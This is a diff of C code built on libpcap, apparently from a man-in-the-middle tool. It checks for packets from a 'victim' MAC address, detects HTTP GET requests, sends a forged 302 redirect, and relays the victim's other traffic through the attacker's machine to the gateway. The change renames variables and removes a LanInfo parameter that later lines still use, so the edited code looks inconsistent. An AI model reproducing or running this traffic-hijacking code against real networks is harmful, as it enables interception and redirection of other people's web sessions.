@@ -1,19 +1,20 @@
 #include "myHeader.h"
 
+
 int checkHttp(const u_char* packet) {
-	PETHERNET_HEADER eth;
-	PIP_HEADER ip;
-	PTCP_HEADER tcp;
+	PETHERNET_HEADER eh;
+	PIP_HEADER ih;
+	PTCP_HEADER th;
 	/* ethernet header */
-	eth = (PETHERNET_HEADER)packet;
+	eh = (PETHERNET_HEADER)packet;
 	/* ip header */
-	if (ntohs(eth->etherType) != IPV4) 
+	if (ntohs(eh->etherType) != IPV4)
 		return 0;
-	ip = (PIP_HEADER)(packet + ETHERNET_HEADER_SIZE);
+	ih = (PIP_HEADER)(packet + ETHERNET_HEADER_SIZE);
 	/* tcp header */
-	if (ntohs(ip->totalLen) <= IP_HEADER_SIZE + TCP_HEADER_SIZE || ip->protocol != IP_PROTOCOL_TCP) 
+	if (ntohs(ih->totalLen) <= IP_HEADER_SIZE + TCP_HEADER_SIZE || ih->protocol != IP_PROTOCOL_TCP)
 		return 0;
-	tcp = (PTCP_HEADER)(packet + ETHERNET_HEADER_SIZE + IP_HEADER_SIZE);
+	th = (PTCP_HEADER)(packet + ETHERNET_HEADER_SIZE + IP_HEADER_SIZE);
 	/* tcp data */
 	char* data = (char*)(packet + TCP_PACKET_SIZE);
 	if (memcmp(data, "GET", 3)) 
@@ -21,20 +22,21 @@ int checkHttp(const u_char* packet) {
 	return 1;
 }
 
-int packetRedirect(pcap_t* handle, struct pcap_pkthdr* pktHeader, const u_char* packet, PLANINFO LanInfo)
+int packetRedirect(pcap_t* handle, struct pcap_pkthdr* pktHeader, const u_char* packet)
 {
-	PTCP_PACKET header;
+	PTCP_PACKET tcpPacket;
 	int packetSize;
-	header = (PTCP_PACKET)packet;
-	u_short ether_type = ntohs(header->ethernet.etherType);
+	tcpPacket = (PTCP_PACKET)packet;
+	u_short ether_type = ntohs(tcpPacket->ethernet.etherType);
 	if (ether_type == IPV4)
 	{
-		if (checkVictim(&header->ethernet, LanInfo))
+		if (checkVictim(&tcpPacket->ethernet))
 		{
 			if (checkHttp(packet))
 			{
+				printf("1\n");
 				u_char sendPacket[1024] = { 0 };
-				packetSize = packet302Redirect(sendPacket, packet, LanInfo);
+				packetSize = packet302Redirect(sendPacket, packet);
 				pcap_sendpacket(handle, sendPacket, packetSize);
 				packetSize = packetForward(sendPacket, packet );
 				pcap_sendpacket(handle, sendPacket, packetSize);
@@ -42,9 +44,9 @@ int packetRedirect(pcap_t* handle, struct pcap_pkthdr* pktHeader, const u_char* 
 			else
 			{
 				/* send to router */
-				memcpy(header->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
-				memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
-				memcpy((char*)packet, header, pktHeader->len);
+				memcpy(tcpPacket->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
+				memcpy(tcpPacket->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
+				memcpy((char*)packet, tcpPacket, pktHeader->len);
 				if (pcap_sendpacket(handle, packet, pktHeader->len) != 0)
 				{
 					fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
@@ -52,12 +54,12 @@ int packetRedirect(pcap_t* handle, struct pcap_pkthdr* pktHeader, const u_char* 
 				}
 			}
 		}
-		else if (checkGateWay(&header->ethernet, LanInfo))
+		else if (checkGateWay(&tcpPacket->ethernet))
 		{
 			/* send to victim */
-			memcpy(header->ethernet.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
-			memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
-			memcpy((char *)packet, header, pktHeader->len);
+			memcpy(tcpPacket->ethernet.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
+			memcpy(tcpPacket->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
+			memcpy((char *)packet, tcpPacket, pktHeader->len);
 			if (pcap_sendpacket(handle, packet, pktHeader->len) != 0)
 			{
 				fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
